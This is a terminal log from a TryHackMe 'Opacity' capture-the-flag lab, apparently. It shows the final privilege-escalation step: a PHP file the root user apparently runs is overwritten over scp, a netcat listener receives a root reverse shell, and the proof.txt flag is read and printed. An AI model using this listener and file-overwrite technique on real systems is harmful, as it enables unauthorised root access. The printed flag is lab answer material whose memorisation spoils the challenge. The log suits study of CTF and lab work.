@@ -1,0 +1,124 @@
+╭─      ~/De/tryhackme_opacity 
+╰─ scp -rv backup.inc.php sysadmin@10.10.220.219:~/scripts/lib/                 
+Executing: program /usr/bin/ssh host 10.10.220.219, user sysadmin, command sftp
+OpenSSH_9.7p1 Debian-5, OpenSSL 3.2.2 4 Jun 2024
+debug1: Reading configuration data /home/h471x/.ssh/config
+debug1: /home/h471x/.ssh/config line 1: Applying options for *
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 10.10.220.219 [10.10.220.219] port 22.
+debug1: Connection established.
+debug1: identity file /home/h471x/.ssh/id_ed25519 type 3
+debug1: identity file /home/h471x/.ssh/id_ed25519-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.7p1 Debian-5
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+debug1: compat_banner: match: OpenSSH_8.2p1 Ubuntu-4ubuntu0.5 pat OpenSSH* compat 0x04000000
+debug1: Authenticating to 10.10.220.219:22 as 'sysadmin'
+debug1: load_hostkeys: fopen /home/h471x/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:VdW4fa9h5tyPlpiJ8i9kyr+MCvLbz7p4RgOGPbWM7Nw
+debug1: load_hostkeys: fopen /home/h471x/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: Host '10.10.220.219' is known and matches the ED25519 host key.
+debug1: Found key in /home/h471x/.ssh/known_hosts:22
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_ext_info_client_parse: server-sig-algs=<ssh-ed25519,sk-ssh-ed25519@openssh.com,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,sk-ecdsa-sha2-nistp256@openssh.com>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: publickey
+debug1: get_agent_identities: bound agent to hostkey
+debug1: get_agent_identities: agent returned 2 keys
+debug1: Will attempt key: /home/h471x/.ssh/id_ed25519 ED25519 SHA256:N/R0iotD+f11xd//k0UJGg+v2ISYRSOr9tiSbrYIgAc explicit agent
+debug1: Will attempt key: h471x@h471xkali RSA SHA256:lwtltNPf8gzZfmN+NhrNzyVfuuXOg68tasPg1vXYIbo agent
+debug1: Offering public key: /home/h471x/.ssh/id_ed25519 ED25519 SHA256:N/R0iotD+f11xd//k0UJGg+v2ISYRSOr9tiSbrYIgAc explicit agent
+debug1: Authentications that can continue: publickey,password
+debug1: Offering public key: h471x@h471xkali RSA SHA256:lwtltNPf8gzZfmN+NhrNzyVfuuXOg68tasPg1vXYIbo agent
+debug1: Authentications that can continue: publickey,password
+debug1: Next authentication method: password
+sysadmin@10.10.220.219's password: 
+Authenticated to 10.10.220.219 ([10.10.220.219]:22) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /home/h471x/.ssh/known_hosts for 10.10.220.219 / (none)
+debug1: client_input_hostkeys: searching /home/h471x/.ssh/known_hosts2 for 10.10.220.219 / (none)
+debug1: client_input_hostkeys: hostkeys file /home/h471x/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "C.UTF-8"
+debug1: Sending subsystem: sftp
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+debug1: update_known_hosts: known hosts file /home/h471x/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+backup.inc.php      100% 2591     9.0KB/s   00:00    
+scp: debug1: truncating at 2591
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: channel 0: free: client-session, nchannels 1
+Transferred: sent 6132, received 3256 bytes, in 5.3 seconds
+Bytes per second: sent 1152.9, received 612.2
+debug1: Exit status 0
+
+╭─      ~/De/tryhackme_opacity 
+╰─ nc -lvnp 4445                                   ─╯
+listening on [any] 4445 ...
+connect to [10.9.4.237] from (UNKNOWN) [10.10.220.219] 58044
+Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 18:59:02 up  1:23,  1 user,  load average: 1.09, 1.08, 0.90
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+sysadmin pts/2    10.9.4.237       18:54    4.00s  0.25s  0.25s -bash
+uid=0(root) gid=0(root) groups=0(root)
+bash: cannot set terminal process group (2443): Inappropriate ioctl for device
+bash: no job control in this shell
+root@opacity:/# ls
+ls
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swap.img
+sys
+tmp
+usr
+var
+root@opacity:/# cd /root
+cd /root
+root@opacity:~# ls
+ls
+proof.txt
+snap
+root@opacity:~# cat proof.txt
+cat proof.txt
+ac0d56f93202dd57dcb2498c739fd20e
+root@opacity:~# 
